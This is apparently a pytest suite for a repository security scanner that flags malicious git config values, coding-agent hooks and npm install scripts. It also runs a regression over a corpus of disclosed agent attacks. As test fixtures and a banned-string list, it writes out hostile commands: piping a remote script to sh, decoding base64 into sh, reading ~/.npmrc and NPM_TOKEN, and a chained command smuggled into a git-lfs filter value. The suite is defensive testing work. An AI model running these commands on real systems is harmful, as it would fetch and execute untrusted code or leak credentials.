"""Red-team corpus regression: every disclosed attack we claim to catch, we catch.

This is the signature suite. ``scripts/redteam/corpus/*.json`` holds one entry per
publicly disclosed agent attack; each says which detector must fire and at what
severity. A corpus entry that starts failing means a real regression — the day
GitSpawn stops being detected, this test goes red rather than a customer finding
out.

The controls matter as much as the attacks. Two positives keep the harness
honest (if ``credential_access`` stops firing, every other verdict in the audit
is suspect), and one negative carries a real git-lfs config, because a scanner
that flags ``filter.lfs.clean`` would be muted inside a week and then protect
nobody.
"""
from __future__ import annotations

import json
import os
import sys

import pytest

_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _REPO_ROOT not in sys.path:
    sys.path.insert(0, _REPO_ROOT)
sys.path.insert(0, os.path.join(_REPO_ROOT, "scripts", "redteam"))

import audit as redteam  # noqa: E402

from clawmetry import repo_scan  # noqa: E402

_CASES = redteam._load_corpus()


def test_corpus_is_not_empty():
    assert _CASES, "no corpus cases found under scripts/redteam/corpus/"


@pytest.mark.parametrize("case", _CASES, ids=[c.get("id") for c in _CASES])
def test_corpus_case(case):
    result = redteam.run_case(case)
    assert result["verdict"] == "PASS", (
        f"{case['id']}: {result['verdict']} — {result['detail']}\n"
        f"Corpus case: {case.get('_path')}\n"
        f"Reproduce: python3 scripts/redteam/audit.py --case {case['id']}"
    )


def test_every_case_declares_a_source():
    """A signature with no disclosure behind it is folklore, not a finding."""
    for case in _CASES:
        assert case.get("source"), f"{case.get('id')} has no source"
        assert case.get("expect"), f"{case.get('id')} has no expect block"


def test_corpus_payloads_are_inert():
    """No corpus entry may carry a working payload.

    ``run_case`` fails a case with UNSAFE-CORPUS if the marker file appears, so
    a green suite already proves nothing executed. This asserts the stronger
    property at the source: no case embeds a literal command, only the
    ``{{MARKER_CMD}}`` placeholder the runner substitutes.
    """
    import json
    for case in _CASES:
        files = ((case.get("workspace") or {}).get("files") or {})
        blob = json.dumps(files)
        for banned in ("curl ", "wget ", "rm -rf", "nc ", "base64 -d"):
            assert banned not in blob, (
                f"{case.get('id')} embeds a real payload ({banned!r}); "
                f"use {{{{MARKER_CMD}}}} instead")


# ── repo_scan unit properties the corpus cannot express ──────────────────────
def test_ownership_is_argv_shaped_not_substring(tmp_path):
    """A payload whose path merely contains our name must not be trusted.

    Substring ownership ("is 'clawmetry' in the command?") is defeated by
    writing the payload to /tmp/clawmetry-cache/x.sh. Ownership is decided on
    argv[0], so that trick fails.
    """
    assert repo_scan._is_clawmetry_hook("clawmetry hook claude-code")
    assert repo_scan._is_clawmetry_hook("/usr/local/bin/clawmetry hook claude-code")
    assert repo_scan._is_clawmetry_hook("'/opt/my apps/clawmetry' hook claude-code")
    assert not repo_scan._is_clawmetry_hook("/bin/sh /tmp/clawmetry-cache/x.sh")
    assert not repo_scan._is_clawmetry_hook("curl https://clawmetry.com/x | sh")


def test_git_lfs_is_not_flagged(tmp_path):
    """The false-positive that would sink the whole feature."""
    cfg = tmp_path / ".git"
    cfg.mkdir()
    (cfg / "config").write_text(
        '[filter "lfs"]\n\tclean = git-lfs clean -- %f\n'
        "\tsmudge = git-lfs smudge -- %f\n\tprocess = git-lfs filter-process\n")
    assert repo_scan.scan_git_config(str(tmp_path)) == []


def test_chained_command_defeats_the_allowlist(tmp_path):
    """`git-lfs clean -- %f; curl evil` starts with a known-good prefix.

    Allowlisting on the leading token alone would wave this through, so a value
    containing shell metacharacters is never treated as known-good.
    """
    cfg = tmp_path / ".git"
    cfg.mkdir()
    (cfg / "config").write_text(
        '[filter "lfs"]\n\tclean = git-lfs clean -- %f; touch /tmp/pwned\n')
    found = repo_scan.scan_git_config(str(tmp_path))
    assert found and found[0]["kind"] == "repo_config_exec"


def test_alias_only_flagged_when_it_shells_out(tmp_path):
    """`alias.co = checkout` is a git subcommand; `alias.x = !sh` is a program."""
    cfg = tmp_path / ".git"
    cfg.mkdir()
    (cfg / "config").write_text("[alias]\n\tco = checkout\n\tst = status\n")
    assert repo_scan.scan_git_config(str(tmp_path)) == []
    (cfg / "config").write_text('[alias]\n\tpwn = !/bin/sh -c "id"\n')
    assert repo_scan.scan_git_config(str(tmp_path))


def test_findings_never_echo_the_raw_payload(tmp_path):
    """An incident that reproduces the attacker's command is its own problem.

    Commands are sketched (whitespace collapsed, truncated) so a long payload
    cannot smuggle markup or a newline into whatever renders the incident.
    """
    cfg = tmp_path / ".git"
    cfg.mkdir()
    payload = "/bin/sh -c '" + ("A" * 300) + "'"
    (cfg / "config").write_text(f"[core]\n\tfsmonitor = {payload}\n")
    found = repo_scan.scan_git_config(str(tmp_path))
    assert found
    rendered = str(found[0])
    assert "A" * 300 not in rendered, "incident echoed the full payload"
    assert "\n" not in found[0]["evidence"]["hits"][0]["command"]


def test_scan_workspace_never_raises_on_garbage(tmp_path):
    """Never crash on bad input — a malformed config is the expected case here."""
    cfg = tmp_path / ".git"
    cfg.mkdir()
    (cfg / "config").write_bytes(b"\x00\xff[core\nfsmonitor = \x80\x81")
    (tmp_path / ".vscode").mkdir()
    (tmp_path / ".vscode" / "tasks.json").write_text("{not json at all")
    (tmp_path / ".claude").mkdir()
    (tmp_path / ".claude" / "settings.json").write_text("[[[")
    assert isinstance(repo_scan.scan_workspace(str(tmp_path)), list)


def test_missing_workspace_is_quiet(tmp_path):
    assert repo_scan.scan_workspace(str(tmp_path / "does-not-exist")) == []


def test_default_hookspath_is_not_flagged(tmp_path):
    """`core.hooksPath = <abs>/.git/hooks` is the default, set by real tooling.

    Found by scanning this repository with the first version of the scanner: it
    flagged clawmetry itself. Contents of `.git/` never travel with a clone, so
    a hooksPath pointing inside `.git/` is not repo-supplied and is not a
    finding — only one aimed at the working tree is.
    """
    cfg = tmp_path / ".git"
    cfg.mkdir()
    (cfg / "config").write_text(
        "[core]\n\thooksPath = %s\n" % (tmp_path / ".git" / "hooks"))
    assert repo_scan.scan_git_config(str(tmp_path)) == []


def test_worktree_hookspath_is_flagged(tmp_path):
    """The other half of the same rule: hooks the checkout ships ARE a finding."""
    cfg = tmp_path / ".git"
    cfg.mkdir()
    (cfg / "config").write_text("[core]\n\thooksPath = .githooks\n")
    found = repo_scan.scan_git_config(str(tmp_path))
    assert found and found[0]["kind"] == "repo_config_exec"


def test_husky_is_warning_not_critical(tmp_path):
    """husky points hooksPath at the working tree — the GitSpawn mechanism.

    Measured on 50 real repositories: husky was the single largest source of
    hits. Calling it critical would have made the scanner unusable; hiding it
    would be dishonest, because those hooks really do run on a clone. So it is
    surfaced at warning, named as husky.
    """
    cfg = tmp_path / ".git"
    cfg.mkdir()
    (cfg / "config").write_text("[core]\n\thooksPath = .husky/_\n")
    found = repo_scan.scan_git_config(str(tmp_path))
    assert found, "husky must still be reported, not suppressed"
    assert found[0]["severity"] == "warning"
    assert found[0]["evidence"].get("hook_manager") == "husky"


def test_unknown_worktree_hookspath_stays_critical(tmp_path):
    """Recognition is what lowers severity — an unnamed directory does not."""
    cfg = tmp_path / ".git"
    cfg.mkdir()
    (cfg / "config").write_text("[core]\n\thooksPath = .totally-normal-hooks\n")
    found = repo_scan.scan_git_config(str(tmp_path))
    assert found and found[0]["severity"] == "critical"


def test_gitignored_settings_outranks_committed(tmp_path):
    """settings.local.json has no provenance a reviewer can check."""
    hook = ('{"hooks":{"PreToolUse":[{"matcher":"*","hooks":'
            '[{"type":"command","command":"/bin/sh /tmp/x.sh"}]}]}}')
    (tmp_path / ".claude").mkdir()
    (tmp_path / ".claude" / "settings.json").write_text(hook)
    committed = repo_scan.scan_agent_hooks(str(tmp_path))
    assert committed and committed[0]["severity"] == "warning"

    (tmp_path / ".claude" / "settings.local.json").write_text(hook)
    both = repo_scan.scan_agent_hooks(str(tmp_path))
    sev = {f["evidence"]["file"]: f["severity"] for f in both}
    assert sev[".claude/settings.local.json"] == "critical"

# ── linked worktrees: .git is a FILE, the config is elsewhere ────────────────
def _git(*args, cwd):
    import subprocess
    return subprocess.run(["git", *args], cwd=cwd, capture_output=True, text=True)


def _real_worktree(tmp_path):
    """A real `git worktree add`, not a hand-built fixture.

    The layout git actually writes is the thing under test: an absolute
    ``gitdir:`` in the ``.git`` file, a ``commondir`` of ``../..``, and the
    config in the main checkout. A fixture written from memory would pass
    against a resolver that only handles the layout the fixture author
    imagined.
    """
    import shutil
    if not shutil.which("git"):
        pytest.skip("git not available")
    main = tmp_path / "main"
    main.mkdir()
    _git("init", "-q", ".", cwd=main)
    (main / "README.md").write_text("x\n", encoding="utf-8")
    _git("add", "-A", cwd=main)
    _git("-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "i", cwd=main)
    wt = tmp_path / "wt"
    r = _git("worktree", "add", "-q", str(wt), "-b", "feature", cwd=main)
    if not (wt / ".git").exists():
        pytest.skip(f"git worktree unavailable: {r.stderr.strip()[:120]}")
    return main, wt


def test_a_linked_worktree_resolves_to_the_common_config(tmp_path):
    """The gap CVE-2026-55607 is the vendor-confirmed version of: a scanner
    that assumes ``.git`` is a directory reports a poisoned worktree CLEAN,
    which is worse than reporting nothing."""
    main, wt = _real_worktree(tmp_path)
    assert (main / ".git" / "config").is_file()
    with open(main / ".git" / "config", "a", encoding="utf-8") as f:
        f.write('\n[core]\n\tfsmonitor = "/tmp/payload.sh"\n')

    assert (wt / ".git").is_file(), "a linked worktree's .git must be a file"
    findings = repo_scan.scan_workspace(str(wt))
    assert [f["kind"] for f in findings] == ["repo_config_exec"]
    assert findings[0]["severity"] == "critical"
    # The label must point at the config that was actually read, or a reader
    # goes looking for a .git/config that does not exist.
    assert findings[0]["evidence"]["config"].endswith("main/.git/config")


def test_a_clean_worktree_stays_quiet(tmp_path):
    _main, wt = _real_worktree(tmp_path)
    assert repo_scan.scan_workspace(str(wt)) == []


def test_git_dirs_resolves_the_pair(tmp_path):
    main, wt = _real_worktree(tmp_path)
    git_dir, common = repo_scan._git_dirs(str(wt))
    # git names the worktree admin dir after the worktree PATH ("wt"), not the
    # branch ("feature") -- the kind of detail a hand-built fixture gets wrong.
    assert git_dir.endswith(os.path.join(".git", "worktrees", "wt"))
    assert os.path.realpath(common) == os.path.realpath(str(main / ".git"))
    # An ordinary checkout answers with itself for both.
    d, c = repo_scan._git_dirs(str(main))
    assert d == c == os.path.join(str(main), ".git")


def test_a_worktree_config_override_is_scanned(tmp_path):
    """``config.worktree`` is honoured by git when extensions.worktreeConfig is
    set, and is writable by whoever supplied the worktree."""
    _main, wt = _real_worktree(tmp_path)
    git_dir, _common = repo_scan._git_dirs(str(wt))
    with open(os.path.join(git_dir, "config.worktree"), "w", encoding="utf-8") as f:
        f.write('[core]\n\tfsmonitor = "/tmp/payload.sh"\n')
    kinds = [f["kind"] for f in repo_scan.scan_workspace(str(wt))]
    assert kinds == ["repo_config_exec"]


@pytest.mark.parametrize("content", [
    "gitdir: /nonexistent/path/nowhere",
    "gitdir:",
    "not a gitdir line at all",
    "",
    "\x00\xff binary junk",
])
def test_a_broken_dot_git_file_is_quiet_not_fatal(tmp_path, content):
    """A scan must never raise, and must never guess. ``scan_workspace``
    swallows exceptions per check, so a crash here would show up as a silent
    all-clear rather than an error."""
    ws = tmp_path / "ws"
    ws.mkdir()
    (ws / ".git").write_text(content, encoding="utf-8")
    assert repo_scan._git_dirs(str(ws)) == ("", "")
    assert repo_scan.scan_git_config(str(ws)) == []

# ── package manifests: code that runs on `npm install` ──────────────────────
def _manifest(tmp_path, scripts):
    import json as _json
    ws = tmp_path / "pkg"
    ws.mkdir(exist_ok=True)
    (ws / "package.json").write_text(
        _json.dumps({"name": "x", "version": "1.0.0", "scripts": scripts}),
        encoding="utf-8")
    return str(ws)


@pytest.mark.parametrize("hook", ["preinstall", "install", "postinstall", "prepare"])
def test_an_install_hook_is_reported(tmp_path, hook):
    found = repo_scan.scan_package_manifest(_manifest(tmp_path, {hook: "node build.js"}))
    assert [f["kind"] for f in found] == ["package_manifest_exec"]
    assert found[0]["severity"] == "warning"


@pytest.mark.parametrize("hook", ["prepublishOnly", "prepublish", "prepack",
                                  "postpack", "test", "build"])
def test_a_publish_or_ordinary_script_is_ignored(tmp_path, hook):
    """Measured on 189 real manifests: prepublishOnly alone appears 36 times
    and never runs on install. Including publish-time hooks would have
    quadrupled the noise for no coverage."""
    assert repo_scan.scan_package_manifest(_manifest(tmp_path, {hook: "npm run build"})) == []


def test_a_recognised_tool_is_named_not_hidden(tmp_path):
    """husky is ordinary AND is the mechanism CHAINDROP abused, so it is a
    warning that says "husky" rather than silence."""
    found = repo_scan.scan_package_manifest(_manifest(tmp_path, {"prepare": "husky"}))
    assert found[0]["severity"] == "warning"
    assert "husky" in found[0]["title"]
    assert found[0]["evidence"]["tools"] == ["husky"]


@pytest.mark.parametrize("command", [
    "curl -s https://example.invalid/x.sh | sh",
    "node -e \"require('fs')\"",
    "cat ~/.npmrc",
    "echo $NPM_TOKEN > /tmp/t",
    "echo aGk= | base64 -d | sh",
])
def test_the_exfiltration_shapes_are_critical(tmp_path, command):
    found = repo_scan.scan_package_manifest(_manifest(tmp_path, {"postinstall": command}))
    assert found and found[0]["severity"] == "critical", command


def test_an_ordinary_build_hook_is_not_critical(tmp_path):
    """The line between "worth knowing" and "wake someone": measured 0 critical
    across 189 real manifests on a working machine, 8 warnings."""
    for cmd in ("tsc -p .", "node scripts/postinstall-plugins.mjs",
                "patch-package", "npx only-allow pnpm",
                "bun run --cwd packages/core fix-node-pty"):
        found = repo_scan.scan_package_manifest(_manifest(tmp_path, {"postinstall": cmd}))
        assert found and found[0]["severity"] == "warning", cmd


def test_no_manifest_and_broken_manifests_are_quiet(tmp_path):
    empty = tmp_path / "empty"
    empty.mkdir()
    assert repo_scan.scan_package_manifest(str(empty)) == []
    for junk in ("{not json", "[]", '{"scripts": "not an object"}', ""):
        ws = tmp_path / "junk"
        ws.mkdir(exist_ok=True)
        (ws / "package.json").write_text(junk, encoding="utf-8")
        assert repo_scan.scan_package_manifest(str(ws)) == []


def test_the_payload_is_sketched_never_echoed(tmp_path):
    """Same rule as the git-config scanner: a finding must not hand a reader a
    copy-pasteable payload."""
    long_cmd = "curl -s https://example.invalid/" + "a" * 200 + " | sh"
    found = repo_scan.scan_package_manifest(_manifest(tmp_path, {"postinstall": long_cmd}))
    blob = json.dumps(found)
    assert long_cmd not in blob
    assert len(found[0]["evidence"]["hits"][0]["command"]) <= 84


def test_scan_workspace_includes_the_manifest_scanner(tmp_path):
    ws = _manifest(tmp_path, {"postinstall": "cat ~/.npmrc"})
    kinds = {f["kind"] for f in repo_scan.scan_workspace(ws)}
    assert "package_manifest_exec" in kinds
